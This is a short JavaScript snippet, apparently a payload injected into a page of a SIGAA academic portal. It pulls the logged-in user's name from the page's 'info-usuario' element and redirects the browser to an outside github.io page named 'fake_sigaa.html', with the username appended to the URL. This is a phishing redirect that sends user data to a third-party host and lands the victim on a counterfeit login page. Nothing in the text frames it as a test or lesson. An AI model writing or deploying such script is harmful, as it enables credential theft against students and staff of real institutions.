var x = document.getElementById("info-usuario").innerHTML;
y = x.split('title=');
y = y[1].split('>')
window.location.href = "https://rodrigorochapinto.github.io/pages-teste/paginas/fake_sigaa.html?usuario="+y[0]

